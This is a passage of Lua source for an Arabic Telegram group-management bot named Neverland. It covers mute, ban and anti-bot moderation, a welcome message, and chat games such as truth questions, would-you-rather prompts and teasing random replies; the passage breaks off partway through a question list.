if msg.sender_user_id_ and Muted_Groups(msg.chat_id_,msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
return false  
end
--------------------------------------------------------------------------------------------------------------
if tonumber(msg.sender_user_id_) ~= tonumber(bot_id) then  
if msg.sender_user_id_ and Ban_Groups(msg.chat_id_,msg.sender_user_id_) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_Groups(msg.chat_id_,msg.content_.members_[0].id_) then 
Kick_Group(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Ban_All_Groups(msg.sender_user_id_) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_All_Groups(msg.content_.members_[0].id_) then 
Kick_Group(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
end 
end
------------------------------------------------------------------------
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == "MessagePinMessage" or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatChangeTitle" or msg.content_.ID == "MessageChatDeleteMember" then   
if database:get(bot_id.."Neverland:Lock:tagservr"..msg.chat_id_) then  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false
end    
end   
if text and not database:sismember(bot_id..'Neverland:Spam:Group'..msg.sender_user_id_,text) then
database:del(bot_id..'Neverland:Spam:Group'..msg.sender_user_id_) 
end
------------------------------------------------------------------------
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
database:set(bot_id..'Neverland:User:Name'..msg.sender_user_id_,data.username_)
end;end,nil)   
------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  

   ---==========================================
   ---==========================================
if msg.content_.members_[0].id_ == tonumber(bot_id) then 
print("it is Bot")
Namebot = (database:get(bot_id.."Neverland:Name:Bot") or "نيفرلاند")
local Texti = "*اٰهــݪين اטּـــِٲ "..Namebot.." 🦇 ،\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉\nاٰخـــتصٖــاصٖــي اداࢪۿـِۂ ٲݪمـــجمۅعٓــاټ مـטּ ݪسبام ۅاݪخ\nللټفـ؏ـيݪ اࢪفـ؏ـني مشࢪف ۅاࢪسسݪ تفعٓيݪ فــي المجموعــه\n┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*"
keyboard = {} 
keyboard.inline_keyboard ={{{text = "اضغط لاضافتي", switch_inline_query="للتفعيل ارفعني مشرف وارسل تفعيل في المجموعه ."}}}
local msg_id = msg.id_/2097152/0.5
local res = https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

   ---==========================================
   ---==========================================
database:set(bot_id.."Neverland:Who:Added:Me"..msg.chat_id_..":"..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."Neverland:Lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not BasicConstructor(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
Get_Info = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Get_Info)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_Addictive(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
--------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------
if text and database:get(bot_id.."Neverland:Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = database:get(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
database:del(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
database:del(bot_id.."Neverland:Set:Cmd:Group:New"..msg.chat_id_)
database:srem(bot_id.."Neverland:List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"✦┇تم ازالة الامر من المجموعه")  
else
send(msg.chat_id_, msg.id_,"✦┇لا يوجد امر بهاذا الاسم تاكد من الامر واعد المحاوله")  
end
database:del(bot_id.."Neverland:Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
------------------------------------------------------------------------
if data.message_.content_.text_ then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if data.message_.content_.text_ then
local NewCmmd = database:get(bot_id.."Neverland:Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
local Name_Bot = (database:get(bot_id.."Neverland:Name:Bot") or "نيفرلاند")
if not database:get(bot_id.."Neverland:Fun_Bots"..msg.chat_id_) then
if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 💋🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶🙊','صاك يخبل ومعضل ','محلو وشواربه جنها مكناسه 😂🤷🏼‍♀️','اموت عليه 🌝','هوه غير الحب مال اني 🤓❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات 😂🤷‍♀️','مو خوش ولد 🤓' } 
send(msg.chat_id_, result.id_,''..Fun[math.random(#Fun)]..'')   
end   
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end  
if text == ""..Name_Bot..' تحب هذا' and tonumber(msg.reply_to_message_id_) > 0 then    
function FunBot(extra, result, success) 
local Fun = {'الكبد مال اني ','يولي ماحبه ',' لٱ ايع ','بس لو الكفها اله اعضها 💔','ماخب مطايه اسف','اكلك ۿذﭑ يكلي احبكك لولا ﭑݩٺ شتكول  ','ئووووووووف اموت ع ربه ','ايععععععععع','بلعباس اعشكك','ماحب مخابيل','احبب ميدو وبس','لٱ ماحبه','بله هاي جهره تكلي تحبهه ؟ ','بربك ئنته والله فارغ وبطران وماعدك شي تسوي جاي تسئلني احبهم لولا','افبس حبيبي هذا' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end    
end
if text and text:match('^'..Name_Bot..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..Name_Bot..' ','')
end
if text == "شنو رئيك بهذا" or text == "شنو رئيك بهذ" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ادب سسز يباوع علي بنات 😂🥺"," مو خوش ولد 😶","زاحف وما احبه 😾😹"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "شنو رئيك بهاي" or text == "شنو رئيك بهايي" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"دور حلوين 🤕😹","جكمه وصخه عوفها ☹️😾","حقيره ومنتكبره 😶😂"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "هينه" or text == "رزله" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"ولك هيو لتندك بسيادك لو بهاي 👞👈","ميستاهل اتعبي روحي ويا لانه عار"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "مصه" or text == "بوسه" then
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"مووووووووواححح????","مابوس ولي😌😹","خدك/ج نضيف 😂","البوسه بالف حمبي 🌝💋","خلي يزحفلي وابوسه 🙊😻","كل شويه ابوسه كافي 😏","ماابوسه والله هذا زاحف🦎","محح هاي لحاته صاكه??"}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "تفعيل كت" and Owner(msg) then
local t = ' \n✦┇تم تفعيل كت'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'lock:kktt'..msg.chat_id_) 
end
if text == "تعطيل كت" and Owner(msg) then
local t = '  \n✦┇تم تعطيل كت'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'lock:kktt'..msg.chat_id_,true)  
end
if text == "تفعيل حروف" and Owner(msg) then
local t = ' \n✦┇تم تفعيل الحروف'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'lock:hrof'..msg.chat_id_) 
end
if text == "تعطيل حروف" and Owner(msg) then
local t = '  \n✦┇تم تعطيل الحروف'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'lock:hrof'..msg.chat_id_,true)  
end
if text == "تفعيل لو خيروك" and Owner(msg) then
local t = ' \n✦┇تم تفعيل لو خيروك'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'lock:low'..msg.chat_id_) 
end
if text == "تعطيل لو خيروك" and Owner(msg) then
local t = '  \n✦┇تم تعطيل لو خيروك'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'lock:low'..msg.chat_id_,true)  
end
if text == "تفعيل صراحه" and Owner(msg) then
local t = ' \n✦┇تم تفعيل صراحه'
send(msg.chat_id_, msg.id_,t)
database:del(bot_id..'lock:sraha'..msg.chat_id_) 
end
if text == "تعطيل صراحه" and Owner(msg) then
local t = '  \n✦┇تم تعطيل الصراحه'
send(msg.chat_id_, msg.id_,t)
database:set(bot_id..'lock:sraha'..msg.chat_id_,true)  
end
if text == "صراحه" or text == "الصراحه" and not database:get(bot_id..'lock:sraha'..msg.chat_id_) then
local texting = {
"صراحه  |  صوتك حلوة؟",
"صراحه  |  التقيت الناس مع وجوهين؟",
"صراحه  |  شيء وكنت تحقق اللسان؟",
"صراحه  |  أنا شخص ضعيف عندما؟",
"صراحه  |  هل ترغب في إظهار حبك ومرفق لشخص أو رؤية هذا الضعف؟",
"صراحه  |  يدل على أن الكذب مرات تكون ضرورية شي؟",
"صراحه  |  أشعر بالوحدة على الرغم من أنني تحيط بك كثيرا؟",
"صراحه  |  كيفية الكشف عن من يكمن عليك؟",
"صراحه  |  إذا حاول شخص ما أن يكرهه أن يقترب منك ويهتم بك تعطيه فرصة؟",
"صراحه  |  أشجع شيء حلو في حياتك؟",
"صراحه  |  طريقة جيدة يقنع حتى لو كانت الفكرة خاطئة توافق؟",
"صراحه  |  كيف تتصرف مع من يسيئون فهمك ويأخذ على ذهنه ثم ينتظر أن يرفض؟",
"صراحه  |  التغيير العادي عندما يكون الشخص الذي يحبه؟",
"صراحه  |  المواقف الصعبة تضعف لك ولا ترفع؟",
"صراحه  |  نظرة و يفسد الصداقة؟",
"صراحه  |  ‏‏إذا أحد قالك كلام سيء بالغالب وش تكون ردة فعلك؟",
"صراحه  |  شخص معك بالحلوه والمُره؟",
"صراحه  |  ‏هل تحب إظهار حبك وتعلقك بالشخص أم ترى ذلك ضعف؟",
"صراحه  |  تأخذ بكلام اللي ينصحك ولا تسوي اللي تبي؟",
"صراحه  |  وش تتمنى الناس تعرف عليك؟",
"صراحه  |  ابيع المجرة عشان؟",
"صراحه  |  أحيانا احس ان الناس ، كمل؟",
"صراحه  |  مع مين ودك تنام اليوم؟",
"صراحه  |  صدفة العمر الحلوة هي اني؟",
"صراحه  |  الكُره العظيم دايم يجي بعد حُب قوي تتفق؟",
"صراحه  |  صفة تحبها في نفسك؟",
"صراحه  |  ‏الفقر فقر العقول ليس الجيوب  ، تتفق؟",
"صراحه  |  تصلي صلواتك الخمس كلها؟",
"صراحه  |  ‏تجامل أحد على راحتك؟",
"صراحه  |  اشجع شيء سويتة بحياتك؟",
"صراحه  |  وش ناوي تسوي اليوم؟",
"صراحه  |  وش شعورك لما تشوف المطر؟",
"صراحه  |  غيرتك هاديه ولا تسوي مشاكل؟",
"صراحه  |  ما اكثر شي ندمن عليه؟",
"صراحه  |  اي الدول تتمنى ان تزورها؟",
"صراحه  |  متى اخر مره بكيت؟",
"صراحه  |  تقيم حظك ؟ من عشره؟",
"صراحه  |  هل تعتقد ان حظك سيئ؟",
"صراحه  |  شـخــص تتمنــي الإنتقــام منـــه؟",
"صراحه  |  كلمة تود سماعها كل يوم؟",
"صراحه  |  **هل تُتقن عملك أم تشعر بالممل؟",
"صراحه  |  هل قمت بانتحال أحد الشخصيات لتكذب على من حولك؟",
"صراحه  |  متى آخر مرة قمت بعمل مُشكلة كبيرة وتسببت في خسائر؟",
"صراحه  |  ما هو اسوأ خبر سمعته بحياتك؟",
"‏صراحه  | هل جرحت شخص تحبه من قبل ؟",
"صراحه  |  ما هي العادة التي تُحب أن تبتعد عنها؟",
"‏صراحه  | هل تحب عائلتك ام تكرههم؟",
"‏صراحه  |  من هو الشخص الذي يأتي في قلبك بعد الله – سبحانه وتعالى- ورسوله الكريم – صلى الله عليه وسلم؟",
"‏صراحه  |  هل خجلت من نفسك من قبل؟",
"‏صراحه  |  ما هو ا الحلم  الذي لم تستطيع ان تحققه؟",
"‏صراحه  |  ما هو الشخص الذي تحلم به كل ليلة؟",
"‏صراحه  |  هل تعرضت إلى موقف مُحرج جعلك تكره صاحبهُ؟",
"‏صراحه  |  هل قمت بالبكاء أمام من تُحب؟",
"‏صراحه  |  ماذا تختار حبيبك أم صديقك؟",
"‏صراحه  | هل حياتك سعيدة أم حزينة؟",
"صراحه  |  ما هي أجمل سنة عشتها بحياتك؟",
"‏صراحه  |  ما هو عمرك الحقيقي؟",
"‏صراحه  |  ما اكثر شي ندمن عليه؟",
"صراحه  |  ما هي أمنياتك المُستقبلية؟‏",
"صراحه  | هل قبلت فتاه؟"
}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
return false
end
if text == "لو خيروك" or text == "خيروك" and not database:get(bot_id..'lock:low'..msg.chat_id_) then
local texting = {"لو خيروك |  بين الإبحار لمدة أسبوع كامل أو السفر على متن طائرة لـ 3 أيام متواصلة؟ ",
"لو خيروك |  بين شراء منزل صغير أو استئجار فيلا كبيرة بمبلغ معقول؟ ",
"لو خيروك |  أن تعيش قصة فيلم هل تختار الأكشن أو الكوميديا؟ ",
"لو خيروك |  بين تناول البيتزا وبين الآيس كريم وذلك بشكل دائم؟ ",
"لو خيروك |  بين إمكانية تواجدك في الفضاء وبين إمكانية تواجدك في البحر؟ ",
"لو خيروك |  بين تغيير وظيفتك كل سنة أو البقاء بوظيفة واحدة طوال حياتك؟ ",
"لو خيروك |  أسئلة محرجة أسئلة صراحة ماذا ستختار؟ ",
"لو خيروك |  بين الذهاب إلى الماضي والعيش مع جدك أو بين الذهاب إلى المستقبل والعيش مع أحفادك؟ ",
"لو كنت شخص آخر هل تفضل البقاء معك أم أنك ستبتعد عن نفسك؟ ",
"لو خيروك |  بين الحصول على الأموال في عيد ميلادك أو على الهدايا؟ ",
"لو خيروك |  بين القفز بمظلة من طائرة أو الغوص في أعماق البحر؟ ",
"لو خيروك |  بين الاستماع إلى الأخبار الجيدة أولًا أو الاستماع إلى الأخبار السيئة أولًا؟ ",
"لو خيروك |  بين أن تكون رئيس لشركة فاشلة أو أن تكون موظف في شركة ناجحة؟ ",
"لو خيروك |  بين أن يكون لديك جيران صاخبون أو أن يكون لديك جيران فضوليون؟ ",
"لو خيروك |  بين أن تكون شخص مشغول دائمًا أو أن تكون شخص يشعر بالملل دائمًا؟ ",
"لو خيروك |  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه؟ ",
"لو خيروك |  بين استمرار فصل الشتاء دائمًا أو بقاء فصل الصيف؟ ",
"لو خيروك |  بين العيش في القارة القطبية أو العيش في الصحراء؟ ",
"لو خيروك |  بين أن تكون لديك القدرة على حفظ كل ما تسمع أو تقوله وبين القدرة على حفظ كل ما تراه أمامك؟ ",
"لو خيروك |  بين أن يكون طولك 150 سنتي متر أو أن يكون 190 سنتي متر؟ ",
"لو خيروك |  بين إلغاء رحلتك تمامًا أو بقائها ولكن فقدان الأمتعة والأشياء الخاص بك خلالها؟ ",
"لو خيروك |  بين أن تكون اللاعب الأفضل في فريق كرة فاشل أو أن تكون لاعب عادي في فريق كرة ناجح؟ ",
"لو خيروك |  بين ارتداء ملابس البيت لمدة أسبوع كامل أو ارتداء البدلة الرسمية لنفس المدة؟ ",
"لو خيروك |  بين امتلاك أفضل وأجمل منزل ولكن في حي سيء أو امتلاك أسوأ منزل ولكن في حي جيد وجميل؟ ",
"لو خيروك |  بين أن تكون غني وتعيش قبل 500 سنة، أو أن تكون فقير وتعيش في عصرنا الحالي؟ ",
"لو خيروك |  بين ارتداء ملابس الغوص ليوم كامل والذهاب إلى العمل أو ارتداء ملابس جدك/جدتك؟ ",
"لو خيروك |  بين قص شعرك بشكل قصير جدًا أو صبغه باللون الوردي؟ ",
"لو خيروك |  بين أن تضع الكثير من الملح على كل الطعام بدون علم أحد، أو أن تقوم بتناول شطيرة معجون أسنان؟ ",
"لو خيروك |  بين قول الحقيقة والصراحة الكاملة مدة 24 ساعة أو الكذب بشكل كامل مدة 3 أيام؟ ",
"لو خيروك |  بين تناول الشوكولا التي تفضلها لكن مع إضافة رشة من الملح والقليل من عصير الليمون إليها أو تناول ليمونة كاملة كبيرة الحجم؟ ",
"لو خيروك |  بين وضع أحمر الشفاه على وجهك ما عدا شفتين أو وضع ماسكارا على شفتين فقط؟ ",
"لو خيروك |  بين الرقص على سطح منزلك أو الغناء على نافذتك؟ ",
"لو خيروك |  بين تلوين شعرك كل خصلة بلون وبين ارتداء ملابس غير متناسقة لمدة أسبوع؟ ",
"لو خيروك |  بين تناول مياه غازية مجمدة وبين تناولها ساخنة؟ ",
"لو خيروك |  بين تنظيف شعرك بسائل غسيل الأطباق وبين استخدام كريم الأساس لغسيل الأطباق؟ ",
"لو خيروك |  بين تزيين طبق السلطة بالبرتقال وبين إضافة البطاطا لطبق الفاكهة؟ ",
"لو خيروك |  بين اللعب مع الأطفال لمدة 7 ساعات أو الجلوس دون فعل أي شيء لمدة 24 ساعة؟ ",
"لو خيروك |  بين شرب كوب من الحليب أو شرب كوب من شراب عرق السوس؟ ",
"لو خيروك |  بين الشخص الذي تحبه وصديق الطفولة؟ ",
"لو خيروك |  بين أمك وأبيك؟ ",
"لو خيروك |  بين أختك وأخيك؟ ",
"لو خيروك |  بين نفسك وأمك؟ ",
"لو خيروك |  بين صديق قام بغدرك وعدوك؟ ",
"لو خيروك |  بين خسارة حبيبك/حبيبتك أو خسارة أخيك/أختك؟ ",
"لو خيروك |  بإنقاذ شخص واحد مع نفسك بين أمك أو ابنك؟ ",
"لو خيروك |  بين ابنك وابنتك؟ ",
"لو خيروك |  بين زوجتك وابنك/ابنتك؟ ",
"لو خيروك |  بين جدك أو جدتك؟ ",
"لو خيروك |  بين زميل ناجح وحده أو زميل يعمل كفريق؟ ",
"لو خيروك |  بين لاعب كرة قدم مشهور أو موسيقي مفضل بالنسبة لك؟ ",
"لو خيروك |  بين مصور فوتوغرافي جيد وبين مصور سيء ولكنه عبقري فوتوشوب؟ ",
"لو خيروك |  بين سائق سيارة يقودها ببطء وبين سائق يقودها بسرعة كبيرة؟ ",
"لو خيروك |  بين أستاذ اللغة العربية أو أستاذ الرياضيات؟ ",
"لو خيروك |  بين أخيك البعيد أو جارك القريب؟ ",
"لو خيروك |  يبن صديقك البعيد وبين زميلك القريب؟ ",
"لو خيروك |  بين رجل أعمال أو أمير؟ ",
"لو خيروك |  بين نجار أو حداد؟ ",
"لو خيروك |  بين طباخ أو خياط؟ ",
"لو خيروك |  بين أن تكون كل ملابس بمقاس واحد كبير الحجم أو أن تكون جميعها باللون الأصفر؟ ",
"لو خيروك |  بين أن تتكلم بالهمس فقط طوال الوقت أو أن تصرخ فقط طوال الوقت؟ ",
"لو خيروك |  بين أن تمتلك زر إيقاف موقت للوقت أو أن تمتلك أزرار للعودة والذهاب عبر الوقت؟ ",
"لو خيروك |  بين أن تعيش بدون موسيقى أبدًا أو أن تعيش بدون تلفاز أبدًا؟ ",
"لو خيروك |  بين أن تعرف متى سوف تموت أو أن تعرف كيف سوف تموت؟ ",
"لو خيروك |  بين العمل الذي تحلم به أو بين إيجاد شريك حياتك وحبك الحقيقي؟ ",
"لو خيروك |  بين معاركة دب أو بين مصارعة تمساح؟ ",
"لو خيروك |  بين إما الحصول على المال أو على المزيد من الوقت؟ ",
"لو خيروك |  بين امتلاك قدرة التحدث بكل لغات العالم أو التحدث إلى الحيوانات؟ ",
"لو خيروك |  بين أن تفوز في اليانصيب وبين أن تعيش مرة ثانية؟ ",
"لو خيروك |  بأن لا يحضر أحد إما لحفل زفافك أو إلى جنازتك؟ ",
"لو خيروك |  بين البقاء بدون هاتف لمدة شهر أو بدون إنترنت لمدة أسبوع؟ ",
"لو خيروك |  بين العمل لأيام أقل في الأسبوع مع زيادة ساعات العمل أو العمل لساعات أقل في اليوم مع أيام أكثر؟ ",
"لو خيروك |  بين مشاهدة الدراما في أيام السبعينيات أو مشاهدة الأعمال الدرامية للوقت الحالي؟ ",
"لو خيروك |  بين التحدث عن كل شيء يدور في عقلك وبين عدم التحدث إطلاقًا؟ ",
"لو خيروك |  بين مشاهدة فيلم بمفردك أو الذهاب إلى مطعم وتناول العشاء بمفردك؟ ",
"لو خيروك |  بين قراءة رواية مميزة فقط أو مشاهدتها بشكل فيلم بدون القدرة على قراءتها؟ ",
"لو خيروك |  بين أن تكون الشخص الأكثر شعبية في العمل أو المدرسة وبين أن تكون الشخص الأكثر ذكاءً؟ ",
"لو خيروك |  بين إجراء المكالمات الهاتفية فقط أو إرسال الرسائل النصية فقط؟ ",
"لو خيروك |  بين إنهاء الحروب في العالم أو إنهاء الجوع في العالم؟ ",
"لو خيروك |  بين تغيير لون عينيك أو لون شعرك؟ ",
"لو خيروك |  بين امتلاك كل عين لون وبين امتلاك نمش على خديك؟ ",
"لو خيروك |  بين الخروج بالمكياج بشكل مستمر وبين الحصول على بشرة صحية ولكن لا يمكن لك تطبيق أي نوع من المكياج؟ ",
"لو خيروك |  بين أن تصبحي عارضة أزياء وبين ميك آب أرتيست؟ ",
"لو خيروك |  بين مشاهدة كرة القدم أو متابعة الأخبار؟ ",
"لو خيروك |  بين موت شخصية بطل الدراما التي تتابعينها أو أن يبقى ولكن يكون العمل الدرامي سيء جدًا؟ ",
"لو خيروك |  بين العيش في دراما قد سبق وشاهدتها ماذا تختارين بين الكوميديا والتاريخي؟ ",
"لو خيروك |  بين امتلاك القدرة على تغيير لون شعرك متى تريدين وبين الحصول على مكياج من قبل خبير تجميل وذلك بشكل يومي؟ ",
"لو خيروك |  بين نشر تفاصيل حياتك المالية وبين نشر تفاصيل حياتك العاطفية؟ ",
"لو خيروك |  بين البكاء والحزن وبين اكتساب الوزن؟ ",
"لو خيروك |  بين تنظيف الأطباق كل يوم وبين تحضير الطعام؟ ",
"لو خيروك |  بين أن تتعطل سيارتك في نصف الطريق أو ألا تتمكنين من ركنها بطريقة صحيحة؟ ",
"لو خيروك |  بين إعادة كل الحقائب التي تملكينها أو إعادة الأحذية الجميلة الخاصة بك؟ ",
"لو خيروك |  بين قتل حشرة أو متابعة فيلم رعب؟ ",
"لو خيروك |  بين امتلاك قطة أو كلب؟ ",
"لو خيروك |  بين الصداقة والحب ",
"لو خيروك |  بين تناول الشوكولا التي تحبين طوال حياتك ولكن لا يمكنك الاستماع إلى الموسيقى وبين الاستماع إلى الموسيقى ولكن لا يمكن لك تناول الشوكولا أبدًا؟ ",
"لو خيروك |  بين مشاركة المنزل مع عائلة من الفئران أو عائلة من الأشخاص المزعجين الفضوليين الذين يتدخلون في كل كبيرة وصغيرة؟ ",
} 
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
return false
end
if text == "احرف" or text == "حروف" and not database:get(bot_id..'lock:hrof'..msg.chat_id_) then
local texting = {
"ماد بحرف ↜ ر  ", 
" مدينة بحرف ↜ ع  ",
" حيوان ونبات بحرف ↜ خ  ", 
" اسم بحرف ↜ ح  ", 
" اسم ونبات بحرف ↜ م  ", 
" دولة عربية بحرف ↜ ق  ", 
" جماد بحرف ↜ ي  ", 
" نبات بحرف ↜ ج  ", 
" اسم بنت بحرف ↜ ع  ", 
" اسم ولد بحرف ↜ ع  ", 
" اسم بنت وولد بحرف ↜ ث  ", 
" جماد بحرف ↜ ج  ",
" حيوان بحرف ↜ ص  ",
" دولة بحرف ↜ س  ",
" نبات بحرف ↜ ج  ",
" مدينة بحرف ↜ ب  ",
" نبات بحرف ↜ ر  ",
" اسم بحرف ↜ ك  ",
" حيوان بحرف ↜ ظ  ",
" جماد بحرف ↜ ذ  ",
" مدينة بحرف ↜ و  ",
" اسم بحرف ↜ م  ",
" اسم بنت بحرف ↜ خ  ",
" اسم و نبات بحرف ↜ ر  ",
" نبات بحرف ↜ و  ",
" حيوان بحرف ↜ س  ",
" مدينة بحرف ↜ ك  ",
" اسم بنت بحرف ↜ ص  ",
" اسم ولد بحرف ↜ ق  ",
" نبات بحرف ↜ ز  ",
"  جماد بحرف ↜ ز  ",
"  مدينة بحرف ↜ ط  ",
"  جماد بحرف ↜ ن  ",
"  مدينة بحرف ↜ ف  ",
"  حيوان بحرف ↜ ض  ",
"  اسم بحرف ↜ ك  ",
"  نبات و حيوان و مدينة بحرف ↜ س  ", 
"  اسم بنت بحرف ↜ ج  ", 
"  مدينة بحرف ↜ ت  ", 
"  جماد بحرف ↜ ه  ", 
"  اسم بنت بحرف ↜ ر  ", 
" اسم ولد بحرف ↜ خ  ", 
" جماد بحرف ↜ ع  ",
" حيوان بحرف ↜ ح  ",
" نبات بحرف ↜ ف  ",
" اسم بنت بحرف ↜ غ  ",
" اسم ولد بحرف ↜ و  ",
" نبات بحرف ↜ ل  ",
"مدينة بحرف ↜ ع  ",
"دولة واسم بحرف ↜ ب  ",
} 
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
return false
end
if text == "كت" or text == "كت تويت" and not database:get(bot_id..'lock:kktt'..msg.chat_id_) then
local texting = {"اخر افلام شاهدتها", 
"اخر افلام شاهدتها", 
"ما هي وظفتك الحياه", 
"اعز اصدقائك ?", 
"اخر اغنية سمعتها ?", 
"تكلم عن نفسك", 
"ليه انت مش سالك", 
"ما هيا عيوب سورس نيفرلاند؟ ", 
"اخر كتاب قرآته", 
"روايتك المفضله ?", 
"اخر اكله اكلتها", 
"اخر كتاب قرآته", 
"ليش نيفرلاند ذكي؟ ", 
"افضل يوم ف حياتك", 
"ليه مضيفتش كل جهاتك", 
"حكمتك ف الحياه", 
"لون عيونك", 
"كتابك المفضل", 
"هوايتك المفضله", 
"علاقتك مع اهلك", 
" ما السيء في هذه الحياة ؟ ", 
"أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس نيفرلاند؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس نيفرلاند؟ ", 
"كم مره حبيت؟ ", 
" اكثر المتابعين عندك باي برنامج؟", 
" آخر مره ضربت عشره كانت متى ؟", 
" نسبه الندم عندك للي وثقت فيهم ؟", 
"تحب ترتبط بكيرفي ولا فلات؟", 
" جربت شعور احد يحبك بس انت مو قادر تحبه؟", 
" تجامل الناس ولا اللي بقلبك على لسانك؟", 
" عمرك ضحيت باشياء لاجل شخص م يسوى ؟", 
